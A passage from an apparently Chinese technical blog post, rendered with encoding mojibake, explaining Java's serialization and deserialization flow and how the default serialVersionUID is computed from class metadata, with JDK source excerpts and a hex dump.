ï¼Œè·å–åŒ…æ‹¬ç±»åã€è‡ªå®šä¹‰<code>serialVersionUID</code>ã€å¯åºåˆ—åŒ–å­—æ®µ <em>ï¼ˆè¿”å›<code>ObjectStreamField</code>ç±»å‹ï¼‰</em> å’Œæ„é€ æ–¹æ³•ï¼Œä»¥åŠ<code>writeObject</code>ã€<code>readObject</code>æ–¹æ³•ç­‰</li><li><code>writeOrdinaryObject()</code>å†™å…¥å¯¹è±¡æ•°æ®<ul><li>å†™å…¥å¯¹è±¡ç±»å‹æ ‡è¯†</li><li><code>writeClassDesc()</code>è¿›å…¥åˆ†æ”¯<code>writeNonProxyDesc()</code>å†™å…¥ç±»æè¿°æ•°æ®<ul><li>å†™å…¥ç±»æè¿°ç¬¦æ ‡è¯†</li><li>å†™å…¥ç±»å</li><li>å†™å…¥SUID <em>ï¼ˆå½“SUIDä¸ºç©ºæ—¶ï¼Œä¼šè¿›è¡Œè®¡ç®—å¹¶èµ‹å€¼ï¼Œç»†èŠ‚è§ä¸‹é¢å…³äºSerialVersionUIDç« èŠ‚ï¼‰</em></li><li>è®¡ç®—å¹¶å†™å…¥åºåˆ—åŒ–å±æ€§æ ‡å¿—ä½</li><li>å†™å…¥å­—æ®µä¿¡æ¯æ•°æ®</li><li>å†™å…¥Block Dataç»“æŸæ ‡è¯†</li><li>å†™å…¥çˆ¶ç±»æè¿°æ•°æ®</li></ul></li><li><code>writeSerialData()</code>å†™å…¥å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®<ul><li>è‹¥ç±»è‡ªå®šä¹‰äº†<code>writeObject()</code>ï¼Œåˆ™è°ƒç”¨è¯¥æ–¹æ³•å†™å¯¹è±¡ï¼Œå¦åˆ™è°ƒç”¨<code>defaultWriteFields()</code>å†™å…¥å¯¹è±¡çš„å­—æ®µæ•°æ® <em>ï¼ˆè‹¥æ˜¯éåŸå§‹ç±»å‹ï¼Œåˆ™é€’å½’å¤„ç†å­å¯¹è±¡ï¼‰</em></li></ul></li></ul></li></ul></li></ol><hr><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><h3 id="ç»§ç»­ç”¨ç®€å•çš„ç¤ºä¾‹æ¥çœ‹çœ‹ååºåˆ—åŒ–ï¼š"><a href="#ç»§ç»­ç”¨ç®€å•çš„ç¤ºä¾‹æ¥çœ‹çœ‹ååºåˆ—åŒ–ï¼š" class="headerlink" title="ç»§ç»­ç”¨ç®€å•çš„ç¤ºä¾‹æ¥çœ‹çœ‹ååºåˆ—åŒ–ï¼š"></a>ç»§ç»­ç”¨ç®€å•çš„ç¤ºä¾‹æ¥çœ‹çœ‹ååºåˆ—åŒ–ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] data; <span class="comment">// read from file or request</span></span><br><span class="line">    ByteArrayInputStream bin = <span class="keyword">new</span> ByteArrayInputStream(data);</span><br><span class="line">    ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bin);</span><br><span class="line">    SerializationDemo demo = (SerializationDemo) in.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å®ƒçš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p><ol><li><code>ObjectInputStream</code>å®ä¾‹åˆå§‹åŒ–æ—¶ï¼Œè¯»å–é­”æœ¯å¤´å’Œç‰ˆæœ¬å·è¿›è¡Œæ ¡éªŒ</li><li>è°ƒç”¨<code>ObjectInputStream.readObject()</code>å¼€å§‹è¯»å¯¹è±¡æ•°æ®<ul><li>è¯»å–å¯¹è±¡ç±»å‹æ ‡è¯†</li><li><code>readOrdinaryObject()</code>è¯»å–æ•°æ®å¯¹è±¡<ul><li><code>readClassDesc()</code>è¯»å–ç±»æè¿°æ•°æ®<ul><li>è¯»å–ç±»æè¿°ç¬¦æ ‡è¯†ï¼Œè¿›å…¥åˆ†æ”¯<code>readNonProxyDesc()</code></li><li>è¯»å–ç±»å</li><li>è¯»å–SUID</li><li>è¯»å–å¹¶åˆ†è§£åºåˆ—åŒ–å±æ€§æ ‡å¿—ä½</li><li>è¯»å–å­—æ®µä¿¡æ¯æ•°æ®</li><li><code>resolveClass()</code>æ ¹æ®ç±»åè·å–å¾…ååºåˆ—åŒ–çš„ç±»çš„<code>Class</code>å¯¹è±¡ï¼Œå¦‚æœè·å–å¤±è´¥ï¼Œåˆ™æŠ›å‡º<code>ClassNotFoundException</code></li><li><code>skipCustomData()</code>å¾ªç¯è¯»å–å­—èŠ‚ç›´åˆ°Block Dataç»“æŸæ ‡è¯†ä¸ºæ­¢</li><li>è¯»å–çˆ¶ç±»æè¿°æ•°æ®</li><li><code>initNonProxy()</code>ä¸­åˆ¤æ–­å¯¹è±¡ä¸æœ¬åœ°å¯¹è±¡çš„SUIDå’Œç±»å <em>ï¼ˆä¸å«åŒ…åï¼‰</em> æ˜¯å¦ç›¸åŒï¼Œè‹¥ä¸åŒï¼Œåˆ™æŠ›å‡º<code>InvalidClassException</code></li></ul></li><li><code>ObjectStreamClass.newInstance()</code>è·å–å¹¶è°ƒç”¨ç¦»å¯¹è±¡æœ€è¿‘çš„é<code>Serializable</code>çš„çˆ¶ç±»çš„æ— å‚æ„é€ æ–¹æ³• <em>ï¼ˆè‹¥ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›<code>null</code>ï¼‰</em> åˆ›å»ºå¯¹è±¡å®ä¾‹</li><li><code>readSerialData()</code>è¯»å–å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®<ul><li>è‹¥ç±»è‡ªå®šä¹‰äº†<code>readObject()</code>ï¼Œåˆ™è°ƒç”¨è¯¥æ–¹æ³•è¯»å¯¹è±¡ï¼Œå¦åˆ™è°ƒç”¨<code>defaultReadFields()</code>è¯»å–å¹¶å¡«å……å¯¹è±¡çš„å­—æ®µæ•°æ®</li></ul></li></ul></li></ul></li></ol><hr><h3 id="å…³äºSerialVersionUID"><a href="#å…³äºSerialVersionUID" class="headerlink" title="å…³äºSerialVersionUID"></a>å…³äºSerialVersionUID</h3><p>åœ¨Javaçš„åºåˆ—åŒ–æœºåˆ¶ä¸­ï¼ŒSUIDå æ®ç€å¾ˆé‡è¦çš„ä½ç½®ï¼Œå®ƒç›¸å½“äºä¸€ä¸ª<code>å¯¹è±¡çš„æŒ‡çº¹ä¿¡æ¯</code>ï¼Œå¯ä»¥ç›´æ¥å†³å®šååºåˆ—åŒ–çš„æˆåŠŸä¸å¦ï¼Œé€šè¿‡ä¸Šé¢å¯¹åºåˆ—åŒ–å’Œååºåˆ—åŒ–æµç¨‹çš„åˆ†æä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œè‹¥SUIDä¸ä¸€è‡´ï¼Œæ˜¯æ— æ³•ååºåˆ—åŒ–æˆåŠŸçš„ã€‚</p><p>ä½†æ˜¯ï¼ŒSUIDåˆ°åº•æ˜¯å¦‚ä½•ç”Ÿæˆçš„ï¼Œå®ƒçš„æŒ‡çº¹ä¿¡æ¯ç»´åº¦åŒ…æ‹¬å¯¹è±¡çš„å“ªäº›å†…å®¹ï¼Œå¯èƒ½è¿˜æ˜¯æœ‰å¾ˆå¤šåŒå­¦ä¸å¤ªæ¸…æ¥šã€‚è¿™é‡Œæˆ‘ä»¬å¯¹ç…§ <a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/class.html#a4100" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a> çš„è¯´æ˜ï¼Œç»“åˆJDKçš„æºä»£ç æ¥ä¸ºå¤§å®¶ç®€å•çš„æ¢³ç†ä¸€ä¸‹ã€‚</p><p>é¦–å…ˆ<code>ObjectStreamClass.getSerialVersionUID()</code>åœ¨è·å–SUIDæ—¶ï¼Œä¼šåˆ¤æ–­SUIDæ˜¯å¦å·²ç»å­˜åœ¨ï¼Œè‹¥ä¸å­˜åœ¨æ‰è°ƒç”¨<code>computeDefaultSUID()</code>è®¡ç®—é»˜è®¤çš„SUIDï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getSerialVersionUID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (suid == <span class="keyword">null</span>) &#123;</span><br><span class="line">        suid = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> PrivilegedAction&lt;Long&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Long <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> computeDefaultSUID(cl);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> suid.longValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å…ˆé¡ºå¸¦æä¸€å˜´ï¼Œ<code>AccessController.doPrivileged()</code>ä¼šå¿½ç•¥JREé…ç½®çš„å®‰å…¨ç­–ç•¥çš„æ£€æŸ¥ï¼Œä»¥ç‰¹æƒçš„èº«ä»½å»æ‰§è¡Œ<code>PrivilegedAction</code>æ¥å£ä¸­çš„<code>run()</code>ï¼Œå¯ä»¥é˜²æ­¢JDKåº•å±‚åœ¨è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶å¯èƒ½å‡ºç°çš„ä¸€äº›æƒé™é—®é¢˜ã€‚è¿™äº›å†…å®¹ä¸æœ¬æ–‡ä¸»é¢˜æ— å…³ï¼Œä¸å¤šä½œè¯¦ç»†è§£é‡Šï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å»çœ‹çœ‹Javaçš„SecurityåŒ…å’Œå…¶ä¸­çš„java.policyã€java.securityæ–‡ä»¶å†…å®¹ã€‚</p><p>é‡ç‚¹æ¥äº†ï¼Œè®¡ç®—SUIDæ—¶ï¼Œä¼šå…ˆåˆ›å»ºä¸€ä¸ª<code>DataOutputStream</code>å¯¹è±¡ï¼Œæ‰€æœ‰äºŒè¿›åˆ¶æ•°æ®å†™å…¥å…¶åŒ…è£…çš„<code>ByteArrayOutputStream</code>ä¸­ï¼š</p><ol><li>å†™å…¥ç±»å <em>ï¼ˆUTF8ï¼‰</em> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dout.writeUTF(cl.getName());</span><br></pre></td></tr></table></figure></div></li><li>å†™å…¥ç±»è®¿é—®æƒé™æ ‡è¯† <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> classMods = cl.getModifiers() &amp;</span><br><span class="line">    (Modifier.PUBLIC | Modifier.FINAL |</span><br><span class="line">        Modifier.INTERFACE | Modifier.ABSTRACT);</span><br><span class="line"></span><br><span class="line">Method[] methods = cl.getDeclaredMethods();</span><br><span class="line"><span class="keyword">if</span> ((classMods &amp; Modifier.INTERFACE) != <span class="number">0</span>) &#123;</span><br><span class="line">    classMods = (methods.length &gt; <span class="number">0</span>) ?</span><br><span class="line">        (classMods | Modifier.ABSTRACT) :</span><br><span class="line">        (classMods &amp; ~Modifier.ABSTRACT);</span><br><span class="line">&#125;</span><br><span class="line">dout.writeInt(classMods);</span><br></pre></td></tr></table></figure></div></li><li>å¦‚æœä¸æ˜¯æ•°ç»„ç±»å‹ï¼Œå†™å…¥å®ç°æ¥å£çš„æ¥å£åï¼ŒæŒ‰æ¥å£åæ’åº <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!cl.isArray()) &#123;</span><br><span class="line">    Class&lt;?&gt;[] interfaces = cl.getInterfaces();</span><br><span class="line">    String[] ifaceNames = <span class="keyword">new</span> String[interfaces.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; interfaces.length; i++) &#123;</span><br><span class="line">        ifaceNames[i] = interfaces[i].getName();</span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(ifaceNames);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ifaceNames.length; i++) &#123;</span><br><span class="line">        dout.writeUTF(ifaceNames[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li>å†™å…¥éç§æœ‰é™æ€æˆ–ç¬æ€å­—æ®µä¿¡æ¯æ•°æ®ï¼ŒåŒ…æ‹¬å­—æ®µåã€å­—æ®µè®¿é—®æƒé™æ ‡è¯†å’Œå­—æ®µç­¾åï¼ŒæŒ‰å­—æ®µåæ’åº <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields = cl.getDeclaredFields();</span><br><span class="line">MemberSignature[] fieldSigs = <span class="keyword">new</span> MemberSignature[fields.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">    fieldSigs[i] = <span class="keyword">new</span> MemberSignature(fields[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(fieldSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ms1.name.compareTo(ms2.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fieldSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = fieldSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL | Modifier.VOLATILE |</span><br><span class="line">            Modifier.TRANSIENT);</span><br><span class="line">    <span class="keyword">if</span> (((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) ||</span><br><span class="line">        ((mods &amp; (Modifier.STATIC | Modifier.TRANSIENT)) == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        dout.writeUTF(sig.name);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li>å¦‚æœå­˜åœ¨ç±»åˆå§‹åŒ–å™¨ <em>ï¼ˆä¸æ˜¯ç±»å®ä¾‹åŒ–çš„æ„é€ æ–¹æ³•ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å»çœ‹çœ‹JVMè§„èŒƒä¸­çš„ç›¸å…³å†…å®¹ï¼‰</em> ï¼Œå†™å…¥å›ºå®šçš„åˆå§‹åŒ–å™¨ä¿¡æ¯æ•°æ® <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (hasStaticInitializer(cl)) &#123;</span><br><span class="line">    dout.writeUTF(<span class="string">"&lt;clinit&gt;"</span>);</span><br><span class="line">    dout.writeInt(Modifier.STATIC);</span><br><span class="line">    dout.writeUTF(<span class="string">"()V"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li>å†™å…¥éç§æœ‰æ„é€ æ–¹æ³•ä¿¡æ¯æ•°æ®ï¼ŒåŒ…æ‹¬æ–¹æ³•å <em>ï¼ˆå›ºå®šä¸º<code>&lt;init&gt;</code>ï¼‰</em> ã€æ–¹æ³•è®¿é—®æƒé™æ ‡è¯†å’Œæ–¹æ³•ç­¾å <em>ï¼ˆåˆ†éš”ç¬¦<code>/</code>ä¼šæ›¿æ¢æˆ<code>.</code>çš„åŒ…åå½¢å¼ï¼‰</em> ï¼ŒæŒ‰æ–¹æ³•ç­¾åæ’åº <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] cons = cl.getDeclaredConstructors();</span><br><span class="line">MemberSignature[] consSigs = <span class="keyword">new</span> MemberSignature[cons.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cons.length; i++) &#123;</span><br><span class="line">    consSigs[i] = <span class="keyword">new</span> MemberSignature(cons[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(consSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ms1.signature.compareTo(ms2.signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; consSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = consSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">            Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">            Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">    <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">        dout.writeUTF(<span class="string">"&lt;init&gt;"</span>);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li>å†™å…¥éç§æœ‰æ–¹æ³•ï¼ŒåŒ…æ‹¬æ–¹æ³•åã€æ–¹æ³•è®¿é—®æƒé™æ ‡è¯†å’Œæ–¹æ³•ç­¾åï¼ŒæŒ‰æ–¹æ³•åå’Œæ–¹æ³•ç­¾åæ’åº <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">MemberSignature[] methSigs = <span class="keyword">new</span> MemberSignature[methods.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">    methSigs[i] = <span class="keyword">new</span> MemberSignature(methods[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(methSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> comp = ms1.name.compareTo(ms2.name);</span><br><span class="line">        <span class="keyword">if</span> (comp == <span class="number">0</span>) &#123;</span><br><span class="line">            comp = ms1.signature.compareTo(ms2.signature);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> comp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = methSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">            Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">            Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">    <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">        dout.writeUTF(sig.name);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><p>ä»¥ä¸Šå°±æ˜¯SUIDä¸­åŒ…å«çš„ç±»çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¾—åˆ°çš„äºŒè¿›åˆ¶ä¸²å¦‚ä¸‹ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 11 53 65 72 69 61 6c  69 7a 61 74 69 6f 6e 44    ..Serial izationD</span><br><span class="line">65 6d 6f 00 00 00 01 00  14 6a 61 76 61 2e 69 6f    emo..... .java.io</span><br><span class="line">2e 53 65 72 69 61 6c 69  7a 61 62 6c 65 00 08 69    .Seriali zable..i</span><br><span class="line">6e 74 46 69 65 6c 64 00  00 00 02 00 01 49 00 0b    ntField. .....I..</span><br><span class="line">73 74 72 69 6e 67 46 69  65 6c 64 00 00 00 02 00    stringFi eld.....</span><br><span class="line">12 4c 6a 61 76 61 2f 6c  61 6e 67 2f 53 74 72 69    .Ljava&#x2F;l ang&#x2F;Stri</span><br><span class="line">6e 67 3b 00 06 3c 69 6e  69 74 3e 00 00 00 01 00    ng;..&lt;in it&gt;.....</span><br><span class="line">16 28 4c 6a 61 76 61 2e  6c 61 6e 67 2e 53 74 72    .(Ljava. lang.Str</span><br><span class="line">69 6e 67 3b 49 29 56 00  04 6d 61 69 6e 00 00 00    ing;I)V. .main...</span><br><span class="line">09 00 16 28 5b 4c 6a 61  76 61 2e 6c 61 6e 67 2e    ...([Lja va.lang.</span><br><span class="line">53 74 72 69 6e 67 3b 29  56                         String;)V</span><br></pre></td></tr></table></figure></div><p>æœ€åï¼Œå°†äºŒè¿›åˆ¶æ•°æ®é€šè¿‡SHA1ç®—æ³•å¾—åˆ°æ‘˜è¦ï¼Œå–å‰8ä½æŒ‰BigEndiançš„å­—èŠ‚é¡ºåºè½¬æ¢æˆé•¿æ•´å‹ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> hash = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = Math.min(hashBytes.length, <span class="number">8</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    hash = (hash &lt;&lt; <span class="number">8</span>) | (hashBytes[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¿”å›çš„<code>hash</code>å°±æ˜¯æœ€ç»ˆçš„SUIDäº†ã€‚</p><p>ç”±æ­¤å¯çŸ¥ï¼Œå½“çˆ¶ç±»æˆ–éåŸå§‹æ•°æ®ç±»å‹å­—æ®µçš„ç±»å†…éƒ¨å‘ç”Ÿå˜æ›´æ—¶ï¼Œå¹¶ä¸ä¼šå½±å“å½“å‰ç±»çš„SUIDå€¼ï¼Œå†ç»“åˆä¹‹å‰çš„å†…å®¹æˆ‘ä»¬è¿˜å¯ä»¥å¼•ç”³å‡ºä¸¤ä¸ªç»“è®ºï¼š</p><ol><li>è‹¥å½“å‰ç±»è‡ªå®šä¹‰äº†<code>readObject()</code>ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šæ­£å¸¸æ‰§è¡Œ<code>readObject()</code>ä¸­æ‰€æœ‰<code>ObjectInputStream.defaultReadObject()</code> <em>ï¼ˆå¦‚æœè°ƒç”¨äº†çš„è¯ï¼‰</em> ä¹‹å‰çš„é€»è¾‘ï¼›å¦åˆ™åœ¨å¤„ç†åˆ°å˜æ›´å¯¹è±¡æ—¶ï¼Œä»ä¼šæŠ›å‡º<code>InvalidClassException</code></li><li>ç”±äºåºåˆ—åŒ–ä¼šå¯¹ç±»çš„å­—æ®µè¿›è¡Œæ’åºï¼Œå¹¶åœ¨ååºåˆ—åŒ–æ—¶æŒ‰é¡ºåºéå†å¤„ç†ï¼Œæ‰€ä»¥ååºåˆ—åŒ–ä¼šæ­£å¸¸å¤„ç†å­—æ®µåæ¯”å˜æ›´å¯¹è±¡ç±»å‹å­—æ®µã€å°ã€çš„å…¶ä»–å­—æ®µ</li></ol><h3 id="å…³äºwriteReplace-å’ŒreadResolve"><a href="#å…³äºwriteReplace-å’ŒreadResolve" class="headerlink" 